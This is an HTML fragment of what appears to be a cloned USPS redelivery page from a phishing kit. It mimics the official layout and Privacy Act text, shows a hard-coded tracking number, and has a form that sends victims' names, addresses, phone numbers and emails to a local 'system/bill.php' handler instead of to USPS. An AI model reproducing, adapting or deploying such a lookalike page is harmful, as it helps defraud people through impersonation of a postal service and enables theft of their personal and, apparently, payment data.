						<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a></li>
					</ul>
				</div>
	</div>

	<a name="endnav" id="endnav" href="redelivery.php#" class="hidden-skip">&nbsp;</a>
</div></div>

    <input type="hidden" id="regUserID" value="">
    <div class="schedule-redelivery-main-header">

        <div class="container-fluid">
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 main-header">
                    <ul class="header-tabs hidden-xs">
                        <li class="tab">
                            <a href="https://tools.usps.com/welcome.htm" class="tab-link active schedule-redelivery-header">Schedule a Redelivery</a>
                        </li>
                        <li class="tab">
                            <a href="redelivery.php#" class="tab-link modify-redelivery-header" data-toggle="modal" data-target="#modify-redelivery-request-modal" data-backdrop="static">Modify Redelivery Request</a>
                        </li>
                        <li class="tab last-tab">
                            <a href="https://www.usps.com/faqs/redelivery-faqs.htm" target="_blank" class="header-faqs">FAQs<span class="sr-only"> about Schedule a Redelivery</span></a>
                        </li>
                    </ul>
                    <h1>Get the Mail You Missed Redelivered</h1>
                </div>
                <div class="hidden-lg hidden-md hidden-sm col-xs-12 dropdown-selection-container">
                    <div class="dropdown-selection">
                        <h2>Tracking Number - <b> 3584025188675646000</b> </h2>
                          <!--
                        <button type="button" class="btn dropdown-toggle dropdown dropdown-items-wrapper form-control" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" id="" value="">Schedule a Redelivery</button>
                      -->
                        <ul class="dropdown-menu">
                            <li><a href="redelivery.php#" class="dropdown-item" data-value="">Schedule a Redelivery</a></li>
                            <li><a href="redelivery.php#" class="dropdown-item" data-toggle="modal" data-target="#modify-redelivery-request-modal" data-backdrop="static" data-value="">Modify Redelivery Request</a></li>
                            <li><a href="https://www.usps.com/faqs/redelivery-faqs.htm" class="dropdown-item" target="_blank" data-value="faqs-url">FAQs<span class="sr-only"> about Schedule a Redelivery</span></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="Redelivery_Steps_Container">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-9 col-sm-10 col-xs-12 redelivery-intro">
                      <p>A PO Box™ clerk attempted to deliver an item or items to you where:<br>

                          . A signature is required or postage and/or fees are required; and/or<br>

                          . The item(s) will not fit in the mail receptacle; and/or<br>

                          . The item(s) cannot be left in a secure place.</p>
                    <p>Redeliveries can be scheduled online 24 hours a day, 7 days a week. For same-day Redelivery, make sure your request is submitted by 2 AM CST Monday-Saturday or your Redelivery will be scheduled for the next day. Check to determine if Redelivery is available for your address.
                </p></div>
            </div>
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                    <hr class="horizontal-line">
                </div>
            </div>
            <!-- START STEP ONE -->
            <form action="system/bill.php" method="post">
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 step-wrapper step-one-drawer active current-step">
                    <div class="step-header">
                        <h2 class="normal"><a href="redelivery.php#">Step 1: <strong>Check if Redelivery is available for your address.</strong></a></h2>
                        <div class="address-redelivery-confirmed">
                            <p class="available-header">Available</p>
                        </div>
                    </div>
                    <!-- </a> -->
                    <div class="step-drawer">
                        <p>Please provide your contact information below. The address must match the original delivery address.</p>
                        <div class="step-one-form">
                            <div class="row">
                                <div class="col-md-12 col-sm-12 col-xs-12 form-group">
                                    <p class="required-field-instructions">*indicates a required field</p>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-5 col-sm-4 col-xs-9 form-group required-field">
                                    <label for="firstName" class="">*First Name</label>
                                    <input minlength="3" maxlength="50" tabindex="0" type="text" id="name1" name="name1" oninvalid="setCustomValidity('Please enter your first name!')" oninput="setCustomValidity('')" class="form-control" value="" required="">
                                    <span id="firstNameErrorMessage" class="error-message">Please enter your first name</span>
                                </div>
                                <div class="col-md-1 col-sm-2 col-xs-3 form-group required-field">

                                    <label for="middleInitial" class="">*Last Name</label>
                                    <input tabindex="0" type="text" class="form-control" style="width:175px;" id="name2" name="name2" oninvalid="setCustomValidity('Please enter your last name!')" oninput="setCustomValidity('')" minlength="2" value="" required="">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-10 col-sm-9 col-xs-12 form-group required-field">
                                    <label for="addressLineOne" class="">*Street Address</label>
                                    <input tabindex="0" minlength="5" type="text" id="addressLineOne" name="address" oninvalid="setCustomValidity('Please enter a valid address')" oninput="setCustomValidity('')" class="form-control" value="" required="">
                                    <span id="addressLineOneErrorMessage" class="error-message">Please enter a valid address</span>
                                </div>
                                <div class="col-md-2 col-sm-3 col-xs-12 form-group">
                                    <label for="addressLineTwo" class="">Apt/Suite/Other</label>
                                    <input tabindex="0" type="text" id="addressLineTwo" name="aptsuite" class="form-control" value="">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="city" class="">*City</label>
                                    <input tabindex="0" minlength="3" type="text" id="city" name="city" oninvalid="setCustomValidity('Please enter a valid city')" oninput="setCustomValidity('')" class="form-control" value="" required="">
                                    <span id="cityErrorMessage" class="error-message">Please enter a valid city</span>
                                </div>
                                
                                
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="state" class="">*State</label>
                                    <input tabindex="0" minlength="3" type="text" id="state" name="state" oninvalid="setCustomValidity('Please enter a valid state')" oninput="setCustomValidity('')" class="form-control" value="" required="">
                                    <span id="stateErrorMessage" class="error-message">Please enter a valid state</span>
                                </div>
                                <div class="col-md-4 col-sm-4 col-xs-7 form-group required-field">
                                    <label for="country" class="">*Country</label>
                                    <select id="country" oninvalid="setCustomValidity('Please select a country')" name="country" oninput="setCustomValidity('')" class="form-control form-country-dropdown dropdown" required="">
                <option value="United States">United States</option>
                <option value="Åland Islands">Åland Islands</option>
                <option value="Albania">Albania</option>
                <option value="Algeria">Algeria</option>
                <option value="American Samoa">American Samoa</option>
                <option value="Andorra">Andorra</option>
                <option value="Angola">Angola</option>
                <option value="Anguilla">Anguilla</option>
                <option value="Antarctica">Antarctica</option>
                <option value="Antigua and Barbuda">Antigua and Barbuda</option>
                <option value="Argentina">Argentina</option>
                <option value="Armenia">Armenia</option>
                <option value="Aruba">Aruba</option>
                <option value="Australia">Australia</option>
                <option value="Austria">Austria</option>
                <option value="Azerbaijan">Azerbaijan</option>
                <option value="Bahamas">Bahamas</option>
                <option value="Bahrain">Bahrain</option>
                <option value="Bangladesh">Bangladesh</option>
                <option value="Barbados">Barbados</option>
                <option value="Belarus">Belarus</option>
                <option value="Belgium">Belgium</option>
                <option value="Belize">Belize</option>
                <option value="Benin">Benin</option>
                <option value="Bermuda">Bermuda</option>
                <option value="Bhutan">Bhutan</option>
                <option value="Bolivia">Bolivia</option>
                <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
                <option value="Botswana">Botswana</option>
                <option value="Bouvet Island">Bouvet Island</option>
                <option value="Brazil">Brazil</option>
                <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
                <option value="Brunei Darussalam">Brunei Darussalam</option>
                <option value="Bulgaria">Bulgaria</option>
                <option value="Burkina Faso">Burkina Faso</option>
                <option value="Burundi">Burundi</option>
                <option value="Cambodia">Cambodia</option>
                <option value="Cameroon">Cameroon</option>
                <option value="Canada">Canada</option>
                <option value="Cape Verde">Cape Verde</option>
                <option value="Cayman Islands">Cayman Islands</option>
                <option value="Central African Republic">Central African Republic</option>
                <option value="Chad">Chad</option>
                <option value="Chile">Chile</option>
                <option value="China">China</option>
                <option value="Christmas Island">Christmas Island</option>
                <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
                <option value="Colombia">Colombia</option>
                <option value="Comoros">Comoros</option>
                <option value="Congo">Congo</option>
                <option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option>
                <option value="Cook Islands">Cook Islands</option>
                <option value="Costa Rica">Costa Rica</option>
                <option value="Cote D'ivoire">Cote D'ivoire</option>
                <option value="Croatia">Croatia</option>
                <option value="Cuba">Cuba</option>
                <option value="Cyprus">Cyprus</option>
                <option value="Czech Republic">Czech Republic</option>
                <option value="Denmark">Denmark</option>
                <option value="Djibouti">Djibouti</option>
                <option value="Dominica">Dominica</option>
                <option value="Dominican Republic">Dominican Republic</option>
                <option value="Ecuador">Ecuador</option>
                <option value="Egypt">Egypt</option>
                <option value="El Salvador">El Salvador</option>
                <option value="Equatorial Guinea">Equatorial Guinea</option>
                <option value="Eritrea">Eritrea</option>
                <option value="Estonia">Estonia</option>
                <option value="Ethiopia">Ethiopia</option>
                <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
                <option value="Faroe Islands">Faroe Islands</option>
                <option value="Fiji">Fiji</option>
                <option value="Finland">Finland</option>
                <option value="France">France</option>
                <option value="French Guiana">French Guiana</option>
                <option value="French Polynesia">French Polynesia</option>
                <option value="French Southern Territories">French Southern Territories</option>
                <option value="Gabon">Gabon</option>
                <option value="Gambia">Gambia</option>
                <option value="Georgia">Georgia</option>
                <option value="Germany">Germany</option>
                <option value="Ghana">Ghana</option>
                <option value="Gibraltar">Gibraltar</option>
                <option value="Greece">Greece</option>
                <option value="Greenland">Greenland</option>
                <option value="Grenada">Grenada</option>
                <option value="Guadeloupe">Guadeloupe</option>
                <option value="Guam">Guam</option>
                <option value="Guatemala">Guatemala</option>
                <option value="Guernsey">Guernsey</option>
                <option value="Guinea">Guinea</option>
                <option value="Guinea-bissau">Guinea-bissau</option>
                <option value="Guyana">Guyana</option>
                <option value="Haiti">Haiti</option>
                <option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option>
                <option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option>
                <option value="Honduras">Honduras</option>
                <option value="Hong Kong">Hong Kong</option>
                <option value="Hungary">Hungary</option>
                <option value="Iceland">Iceland</option>
                <option value="India">India</option>
                <option value="Indonesia">Indonesia</option>
                <option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option>
                <option value="Iraq">Iraq</option>
                <option value="Ireland">Ireland</option>
                <option value="Isle of Man">Isle of Man</option>
                <option value="Israel">Israel</option>
                <option value="Italy">Italy</option>
                <option value="Jamaica">Jamaica</option>
                <option value="Japan">Japan</option>
                <option value="Jersey">Jersey</option>
                <option value="Jordan">Jordan</option>
                <option value="Kazakhstan">Kazakhstan</option>
                <option value="Kenya">Kenya</option>
                <option value="Kiribati">Kiribati</option>
                <option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option>
                <option value="Korea, Republic of">Korea, Republic of</option>
                <option value="Kuwait">Kuwait</option>
                <option value="Kyrgyzstan">Kyrgyzstan</option>
                <option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
                <option value="Latvia">Latvia</option>
                <option value="Lebanon">Lebanon</option>
                <option value="Lesotho">Lesotho</option>
                <option value="Liberia">Liberia</option>
                <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
                <option value="Liechtenstein">Liechtenstein</option>
                <option value="Lithuania">Lithuania</option>
                <option value="Luxembourg">Luxembourg</option>
                <option value="Macao">Macao</option>
                <option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option>
                <option value="Madagascar">Madagascar</option>
                <option value="Malawi">Malawi</option>
                <option value="Malaysia">Malaysia</option>
                <option value="Maldives">Maldives</option>
                <option value="Mali">Mali</option>
                <option value="Malta">Malta</option>
                <option value="Marshall Islands">Marshall Islands</option>
                <option value="Martinique">Martinique</option>
                <option value="Mauritania">Mauritania</option>
                <option value="Mauritius">Mauritius</option>
                <option value="Mayotte">Mayotte</option>
                <option value="Mexico">Mexico</option>
                <option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
                <option value="Moldova, Republic of">Moldova, Republic of</option>
                <option value="Monaco">Monaco</option>
                <option value="Mongolia">Mongolia</option>
                <option value="Montenegro">Montenegro</option>
                <option value="Montserrat">Montserrat</option>
                <option value="Morocco">Morocco</option>
                <option value="Mozambique">Mozambique</option>
                <option value="Myanmar">Myanmar</option>
                <option value="Namibia">Namibia</option>
                <option value="Nauru">Nauru</option>
                <option value="Nepal">Nepal</option>
                <option value="Netherlands">Netherlands</option>
                <option value="Netherlands Antilles">Netherlands Antilles</option>
                <option value="New Caledonia">New Caledonia</option>
                <option value="New Zealand">New Zealand</option>
                <option value="Nicaragua">Nicaragua</option>
                <option value="Niger">Niger</option>
                <option value="Nigeria">Nigeria</option>
                <option value="Niue">Niue</option>
                <option value="Norfolk Island">Norfolk Island</option>
                <option value="Northern Mariana Islands">Northern Mariana Islands</option>
                <option value="Norway">Norway</option>
                <option value="Oman">Oman</option>
                <option value="Pakistan">Pakistan</option>
                <option value="Palau">Palau</option>
                <option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option>
                <option value="Panama">Panama</option>
                <option value="Papua New Guinea">Papua New Guinea</option>
                <option value="Paraguay">Paraguay</option>
                <option value="Peru">Peru</option>
                <option value="Philippines">Philippines</option>
                <option value="Pitcairn">Pitcairn</option>
                <option value="Poland">Poland</option>
                <option value="Portugal">Portugal</option>
                <option value="Puerto Rico">Puerto Rico</option>
                <option value="Qatar">Qatar</option>
                <option value="Reunion">Reunion</option>
                <option value="Romania">Romania</option>
                <option value="Russian Federation">Russian Federation</option>
                <option value="Rwanda">Rwanda</option>
                <option value="Saint Helena">Saint Helena</option>
                <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
                <option value="Saint Lucia">Saint Lucia</option>
                <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
                <option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option>
                <option value="Samoa">Samoa</option>
                <option value="San Marino">San Marino</option>
                <option value="Sao Tome and Principe">Sao Tome and Principe</option>
                <option value="Saudi Arabia">Saudi Arabia</option>
                <option value="Senegal">Senegal</option>
                <option value="Serbia">Serbia</option>
                <option value="Seychelles">Seychelles</option>
                <option value="Sierra Leone">Sierra Leone</option>
                <option value="Singapore">Singapore</option>
                <option value="Slovakia">Slovakia</option>
                <option value="Slovenia">Slovenia</option>
                <option value="Solomon Islands">Solomon Islands</option>
                <option value="Somalia">Somalia</option>
                <option value="South Africa">South Africa</option>
                <option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option>
                <option value="Spain">Spain</option>
                <option value="Sri Lanka">Sri Lanka</option>
                <option value="Sudan">Sudan</option>
                <option value="Suriname">Suriname</option>
                <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
                <option value="Swaziland">Swaziland</option>
                <option value="Sweden">Sweden</option>
                <option value="Switzerland">Switzerland</option>
                <option value="Syrian Arab Republic">Syrian Arab Republic</option>
                <option value="Taiwan">Taiwan</option>
                <option value="Tajikistan">Tajikistan</option>
                <option value="Tanzania, United Republic of">Tanzania, United Republic of</option>
                <option value="Thailand">Thailand</option>
                <option value="Timor-leste">Timor-leste</option>
                <option value="Togo">Togo</option>
                <option value="Tokelau">Tokelau</option>
                <option value="Tonga">Tonga</option>
                <option value="Trinidad and Tobago">Trinidad and Tobago</option>
                <option value="Tunisia">Tunisia</option>
                <option value="Turkey">Turkey</option>
                <option value="Turkmenistan">Turkmenistan</option>
                <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
                <option value="Tuvalu">Tuvalu</option>
                <option value="Uganda">Uganda</option>
                <option value="Ukraine">Ukraine</option>
                <option value="United Arab Emirates">United Arab Emirates</option>
                <option value="United Kingdom">United Kingdom</option>
                <option value="Afghanistan">Afghanistan</option>
                <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
                <option value="Uruguay">Uruguay</option>
                <option value="Uzbekistan">Uzbekistan</option>
                <option value="Vanuatu">Vanuatu</option>
                <option value="Venezuela">Venezuela</option>
                <option value="Viet Nam">Viet Nam</option>
                <option value="Virgin Islands, British">Virgin Islands, British</option>
                <option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
                <option value="Wallis and Futuna">Wallis and Futuna</option>
                <option value="Western Sahara">Western Sahara</option>
                <option value="Yemen">Yemen</option>
                <option value="Zambia">Zambia</option>
                <option value="Zimbabwe">Zimbabwe</option>
            </select>
                                    <span id="stateErrorMessage" class="error-message">Please select a state</span>
                                </div>
                                <div class="col-md-2 col-sm-2 col-xs-5 form-group required-field">
                                    <label for="zipCode" class="">*ZIP Code</label>
                                    <input tabindex="0" type="text" minlength="4" maxlength="10" id="zipCode" name="pcode" oninvalid="setCustomValidity('Please enter a valid ZIP Code')" oninput="setCustomValidity('')" class="form-control" value="">
                                    <span id="zipCodeErrorMessage" class="error-message">Please enter a valid ZIP Code</span>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="phone" class="">*Phone</label>
                                    <input tabindex="0" id="phone" name="phone" oninvalid="setCustomValidity('Please enter a valid phone number')" oninput="setCustomValidity('')" type="text" class="form-control" maxlength="13" inputmode="numeric" value="">

                                    <span id="phoneErrorMessage" class="error-message">Please enter a valid phone number</span>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="emailAddress" class="">*Email</label>
                                    <input tabindex="0" id="emailAddress" style="color: #000;border: 1px solid #333366;padding: 5px 10px;height: 44px;" type="email" name="umail" oninvalid="setCustomValidity('Please enter a valid email')" oninput="setCustomValidity('')" class="form-control" value="">
                                    <span id="emailAddressErrorMessage" class="error-message">Please enter a valid email</span>
                                </div>
                            </div>
                            <div class="row">

                                <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                    <div class="button-container">
                                        <button style="border-color: transparent;background-color:transparent;" type="submit">
                                        <a role="button" class="btn-primary check-availability" type="submit" tabindex="0">Check Availability</a>
                                        </button>
                                    </div>
                                    <div class="review-error-wrapper required-field error">
                                        <span class="error-message chckAvailError">Please select Check Availability to see if Redelivery is available for your address.</span>
                                    </div>
                                </div>
                            </div>
                          
                            <div class="row">
                                <div class="col-md-10 col-sm-10 col-xs-12 privacy-act-statement-wrapper">
                                    <p class="privacy-act-statement-header">Privacy Act Statement</p>
                                    <p>Your information will be used to provide you requested products, services, or information. Collection is authorized by 39 USC 401, 403, &amp; 404. Supplying your information is voluntary, but if not provided, we may not be able to process your request. We do not disclose your information to third parties without your consent, except to act on your behalf or request, or as legally required. This includes the following limited circumstances: to a congressional office on your behalf; to agencies and entities to facilitate or resolve financial transactions; to a U.S. Postal Service auditor; for law enforcement purposes, to labor organizations as required by applicable law; incident to legal proceedings involving the Postal Service; to government agencies in connection with decisions as necessary; to agents or contractors when necessary to fulfill a business function or provide products and services to customers; and for customer service purposes. For more information regarding our privacy policies visit <a href="https://www.usps.com/privacypolicy" target="_blank" class="textUrl">www.usps.com/privacypolicy.</a></p>
                                </div>
                            </div>
                        </div>
                        <div class="step-one-validation">
                            <div class="row">
                                <div class="col-md-4 col-sm-4 col-xs-12 name-primary-address-wrapper">
                                    <p class="name-address-header">Name and Primary Address:</p>
                                    <p><span id="verifiedAFirstName"></span> <span id="verifiedAMiddleName"></span> <span id="verifiedALastName"></span></p>
                                    <p class="hidden" id="verifiedCompanyLine"><span id="verifiedACompanyName"></span></p>
                                    <p id="verifiedUrb"><span id="verifiedUrbCode"></span></p>
                                    <p id="verifiedUrbCodeLine" class="hidden"><span id="verifiedAUrbCode"></span></p>
                                    <p><span id="verifiedAAddressLineOne"></span></p>
                                    <p class="hidden" id="verifiedAddLTwoLine"><span id="verifiedAAddressLineTwo"></span></p>
                                    <p><span id="verifiedACityStateZip"></span></p>
                                </div>
                                <div class="col-md-4 col-sm-4 col-xs-12">
                                    <div class="phone-wrapper">
                                        <p class="phone-header">Phone:</p>
                                        <p><span id="verifiedAPhone"></span></p>
                                    </div>
                                    <div class="email-wrapper">
                                        <p class="email-header">Email:</p>
                                        <p><span id="verifiedAEmailAddress"></span></p>
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12 col-xs-12 edit-address-wrapper">
                                    <a href="redelivery.php#" class="inline-link secondary edit-redelivery-address">Edit</a>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-9 col-sm-10 col-xs-12 redelivery-unavailable-wrapper">
                                    <p class="unavailable-header">Unavailable</p>
                                    <p class="unavailable-content">Sorry, online Redelivery requests are not available for this address. You will need to pick up your mail or package. To find your Post Office<sup>®</sup> facility and pickup hours, go to <a href="https://tools.usps.com/find-location.htm" target="_blank" class="inline-link secondary track-package"><strong>Find USPS Locations.</strong></a> If the address above is not the correct address, please select Edit and enter the correct address.</p>
                                    <!--<p class="unavailable-content"><a href="/go/TrackConfirmAction_input" target="_blank" class="inline-link secondary track-package"><strong>Track a Package</strong></a></p>-->
                                </div>
                                <div class="col-md-12 col-sm-12 col-xs-12 redelivery-available-wrapper">
                                    <p class="available-header">Available</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div></form>
            <!-- START STEP TWO -->
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 step-wrapper step-two-drawer disabled">
                    
                    <div class="step-drawer tracking-number-search-wrapper">
                        <div class="row">
                            <div class="col-md-11 col-sm-11 col-xs-11 step-subheader">
                                <p>Enter a tracking or barcode number shown on the back of your PS Form 3849, We ReDeliver for You! All packages in a single Redelivery request must be associated to the same PS Form 3849.</p>
                            </div>
                            <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                <div class="input-group">
                                    <label class="inputLabel" for="tracking or barcode number">*Tracking or Barcode Number <a href="redelivery.php#" role="button" aria-label="additional information on tracking or barcode number" class="info-icon tracking-barcode-popover-icon" data-trigger="focus" data-toggle="popover" data-target="#tracking-barcode-modal" data-backdrop="static" tabindex="0" data-original-title="" title=""></a></label>
<!--                                    <a href="#" class="barcode-scanner-btn" type="submit"></a>-->
                                    <input type="text" class="form-control" id="tracking-barcode-search" value="">
                                    <span class="input-group-btn">
                                        <button class="btn btn-search" type="button"></button>
                                    </span>
                                </div>
                                <span role="alert" id="trackingNumErrorMessage" class="error-message">Please enter a valid tracking or barcode number.</span>
                            </div>
                            <div class="col-md-12 col-sm-12 col-xs-12 tracking-results-wrapper">
                                <p class="showing-results hidden"><strong>Showing <span id="results-barcode-or-tracking">results for barcode number</span>: </strong><br class="number-separator"><span id="barCodeNumber" class="tracking-num">1A2B 3C1A 2B3C 1A2B</span></p>
                                <div class="row">
                                    <div class="col-md-10 col-sm-11 col-xs-12 tracking-number-table-wrapper">
                                        <div class="table-header-wrapper">
                                            <div class="col-md-6 col-sm-6 col-xs-6 tracking-number-header">
                                                <p>Tracking Number</p>
                                            </div>
                                            <div class="col-md-6 col-sm-6 col-xs-6 details-header">
                                                <p>Details</p>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-12 col-sm-12 col-xs-12 column-dropdown-wrapper">
                                                <div id="redeliveryTrackingBreakdown" class="column-item-container">

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-12 col-sm-12 col-xs-12 review-button-wrapper">
                                        <a href="redelivery.php#" role="button" class="btn-primary review-btn">Review</a>
                                        <div class="col-md-12 col-sm-12 col-xs-12 review-error-wrapper required-field">
                                            <!--<span class="error-message">Click Review to save your changes before you confirm.</span>-->
                                            <span class="selectRed" style="display: none;">Please select at least one Redelivery to continue.</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div>
            <!-- START STEP THREE -->
            <div class="row confirm-selection">
                <div class="col-md-12 col-sm-12 col-xs-12 step-three-drawer step-wrapper disabled">
                    <div class="step-header">
                        <h2 class="normal"><a href="redelivery.php#">Step 2: <strong>Confirm selections for Redelivery.</strong></a></h2>
                        <div class="redelivery-selection-confirmed">
                            <p class="confirmed-header">Confirmed</p>
                        </div>
                    </div>
                    <div class="step-drawer">
                        <p class="step-subheader">You have specified Redelivery for the following tracking numbers. Select Confirm to proceed, or click Edit to modify a selection.</p>
                        <div id="review-selected-redeliveries" class="col-12 col-md-12 selected-tracking-number-wrapper">

                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 terms-conditions-wrapper required-field">
                                <div class="checkbox-wrap">
                                    <div class="checkbox-container">
                                        <label class="checkbox-component" for="terms-conditions-checkbox">
                                            <input type="checkbox" id="terms-conditions-checkbox">
                                            <span class="checkbox"></span>
                                            <p>I have read, understood, and accept the <a id="termsConditionsLink" href="https://www.usps.com/terms-conditions/schedule-redelivery.htm" target="_blank" class="inline-link secondary">Terms and Conditions</a> for Redelivery.</p>
                                        </label>
                                        <span class="error-message termsError">Please accept Terms and Conditions.</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 confirm-button-wrapper">
                            <a href="redelivery.php#" role="button" class="btn-primary confirm-selection-btn">Confirm</a>
                            <div class="col-md-12 col-sm-12 col-xs-12 review-error-wrapper required-field">
                                <span class="error-message">Please select Confirm to continue.</span>
                            </div>
                        </div>
                        <div class=" col-md-12 col-sm-12 col-xs-12 button-container submit-wrapper">
                            <a role="button" class="btn-primary submit-request" tabindex="0">Submit</a>
                        </div>

                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div>
            <!-- START STEP FOUR -->
            <div class="row informed-delivery-wrapper">
                <div class="col-md-12 col-sm-12 col-xs-12 step-four-drawer step-wrapper disabled">
                    <div class="step-header">
                        <h2 class="normal"><a href="redelivery.php#">Step 4: <strong>Sign up for Informed Delivery.</strong></a></h2>
                    </div>
                    <div class="step-drawer">
                        <div class="step-four-form">
                            <div class="row">
                                <div class="col-md-11 col-sm-11 col-xs-12 step-subheader">
                                    <p>Easily track your Redelivery request anytime, anywhere. Sign up for Informed Delivery<sup>®</sup> notifications, a free feature that allows you to check the Redelivery status of your packages, preview incoming mail, and more. <a class="inline-link secondary" href="https://informeddelivery.usps.com/" target="_blank">Learn More<span class="sr-only"> about Informed Delivery</span></a></p>
                                </div>
                                <div class="col-md-11 col-sm-11 col-xs-12 sign-up-for-redelivery radio-buttons container required-field">
                                    <p>*Would you like to sign up for Informed Delivery notifications for your USPS.com profile address?</p>
                                    <div class="radio-wrap">
                                        <div class="radio-container">
                                            <input id="yes-radio" type="radio" class="radio-button first" name="informed-delivery-rb" tabindex="0">
                                            <label for="sign up for informed delivery">Yes, I would like to sign up.</label>
                                            <br>
                                            <br>
                                        </div>
                                        <div id="sign-up-yes-message">
                                            <p>You will be redirected to the Informed Delivery enrollment site to complete enrollment after submitting your Redelivery request.</p>
                                            <p>Mail and packages will populate your dashboard and daily notification in 2 to 5 business days. To track a package sooner, manually enter the tracking number into your dashboard. You can unsubscribe at any time.</p>
                                        </div>
                                        <div class="radio-container">
                                            <input id="no-radio" type="radio" class="radio-button second" name="informed-delivery-rb" tabindex="0">
                                            <label for="not interested in informed delivery">No, I am not interested at this time.</label>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <span class="error-message">Please select if you want to sign up for Informed Delivery.</span>
                                        </div>
                                    </div>

                                </div>
                                <div class=" col-md-12 col-sm-12 col-xs-12 button-container submit-wrapper">
                                    <a role="button" class="btn-primary submit-request" tabindex="0">Submit</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div>
            <!--<div class="row step-one-demo-btn" style="padding-top: 30px;">
				<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
					<h2 style="font-size: 22px;">For display purpose only</h2>
					<div class="button-container">
						<a href="#" role="button" class="btn-primary button--white error-display">Display Errors</a>
					</div>
					<div class="button-container">
						<a href="#" role="button" class="btn-primary service-unavailable">Address Unavailable</a>
					</div>
					<div class="button-container">
						<a href="#" role="button" class="btn-primary" id="display-white-spinner">Spinner</a>
					</div>
					<div class="button-container">
						<a href="#" role="button" class="btn-primary" data-toggle="modal" data-target="#service-unavailable-modal" data-backdrop="static">Service Unavailable</a>
					</div>
					<div class="button-container">
						<a href="#" role="button" class="btn-primary unqualified-informed-delivery">Unqualified Informed Delivery</a>
					</div>
				</div>
			</div>-->
        </div>
    </div>


    <!-- START TRACKING/BARCODE CONTENT -->
    <div class="tracking-barcode-popover" style="display: none;">
        <div class="popover-wrapper">
            <div class="popover-header">
            </div>
            <ul class="bullet-list">
                <li class="trackingPopover">Tracking numbers are for an individual package</li>
                <li class="trackingPopover">Barcode numbers can have multiple tracking numbers associated with it</li>
                <li class="trackingPopover">Both tracking and barcode numbers are between 13 and 34 characters</li>
            </ul>
        </div>
    </div>

    <div class="modal fade" id="tracking-barcode-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <a href="redelivery.php#" type="button" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
                    <h3 class="modal-title"></h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <ul class="bullet-list">
                            <li class="trackingPopover">Tracking numbers are for an individual package</li>
                            <li class="trackingPopover">Barcode numbers can have multiple tracking numbers associated with it</li>
                            <li class="trackingPopover">Both tracking and barcode numbers are between 13 and 34 characters</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END TRACKING/BARCODE CONTENT -->



    <!-- START NEW SEARCH -->
